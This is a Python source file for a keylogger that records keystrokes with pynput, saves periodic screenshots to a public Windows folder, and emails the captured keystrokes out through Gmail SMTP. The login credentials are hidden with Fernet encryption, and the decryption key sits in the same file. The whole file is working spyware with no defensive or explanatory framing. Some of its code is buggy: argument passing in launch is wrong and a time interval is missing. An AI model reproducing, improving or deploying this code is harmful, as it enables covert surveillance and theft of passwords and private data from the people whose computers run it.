import pathlib
import sys
import smtplib
import time
from multiprocessing import Process
from threading import Timer
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from PIL import ImageGrab


def decrypt(message, key=b'ei5t2CQp9CfR33BMEgiRYwAdkwdutJ6v62gNoP3hVrQ='):
    return Fernet(key).decrypt(bytes(message, 'utf-8')).decode("utf-8")


class Logger:
    GMAIL_SMTP = "smtp.gmail.com"
    GMAIL_SSL_PORT = 465
    SERVER = smtplib.SMTP_SSL(host=GMAIL_SMTP, port=GMAIL_SSL_PORT)

    def __init__(self, email, password, logged_data_limit, file_path='C:\\Users\\Public\\Logs\\'):
        print("Initiating a logger ...")
        self._email = email
        self._password = password
        self.logged_data = ''
        self.logged_data_limit = logged_data_limit
        self.screen_path = file_path + 'Screenshots\\'

    def login(self):
        print(f"Logging in ...")
        Logger.SERVER.login(user=self._email, password=self._password)

    def log(self, word='', remove=0):
        if remove == 0:
            print(f"Adding word ...")
            self.logged_data += word if word == ' ' else f"{word}"[1:-1]
            return None
        print(f"Removing {remove} characters...")
        self.logged_data = self.logged_data[:-remove]

    def send(self):
        print(f"Sending logged data ...")
        Logger.SERVER.sendmail(from_addr=self._email,
                               to_addrs=self._email,
                               msg=self.logged_data)

    def launch(self, time_limit_in_sec, time_interval):
        print(f"Launched logger ...")
        self.log_keys(time_limit_in_sec=time_limit_in_sec)

        p1 = Process(target=self.log_keys, args=(self, time_limit_in_sec,))
        p1.start()
        p2 = Process(target=self.log_screen, args=(self, time_interval))
        p2.start()

        p1.join(timeout=300)
        p2.join(timeout=300)

        p1.terminate()
        p2.terminate()
        self.end()

    def reached_limit(self):
        return len(self.logged_data) >= self.logged_data_limit

    def log_keys(self, time_limit_in_sec):
        def on_press(key):
            print("Key pressed ...")
            if key in (Key.space,
                       Key.enter):
                self.log(word=' ')
                return None
            if key is Key.backspace:
                self.log(remove=1)
                return None
            if key in (Key.esc, Key.shift_l, Key.shift_r):
                return None
            self.log(word=key)

            self.send() if self.reached_limit() else None

        print("Listening ...")
        with Listener(on_press=on_press) as listening:
            Timer(time_limit_in_sec,
                  listening.stop).start()  # created a timer thread to time the listener. After the
            # time limit the listener thread gets stopped
            listening.join()  # this is an ongoing thread that gets stopped by the timer above
            print("Time limit passed ...")  # if the listener is stopped the parser executes this line

    def log_screen(self, time_interval):
        pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)

        for number in range(60):
            pic = ImageGrab.grab()
            pic.save(self.screen_path + f'screenshot{number}.png')
            time.sleep(time_interval)

    def end(self):
        self.send()  # sending remaining data
        print("Closing the connection to the server ...")
        Logger.SERVER.quit()


def main(logged_data_limit, time_limit_in_sec):
    logger = Logger(email=decrypt(
            "gAAAAABgqPRCSVmNGRf60VYyIUk_CMCuGTPpqxKiziqAOx2FcoHExzDp2ObdTGRiAXoXg8YDu7JeqfZI_pEGpwcaDDMks1mhlqoagNM1esQ0nU-HRfQawLg="),
            password=decrypt(
                    "gAAAAABgqPRC1-pspwymaSPSPSd5tp6LTuyY63aGqncLt7bUWj4mOTveGOyVIFvhuhVDmfDU6_b9f1H_T8g4Lo5FBCxoFL_heQ=="),
            logged_data_limit=logged_data_limit)
    logger.login()
    logger.launch(time_limit_in_sec=time_limit_in_sec)


main(*(int(arg) for arg in sys.argv[1:3]))
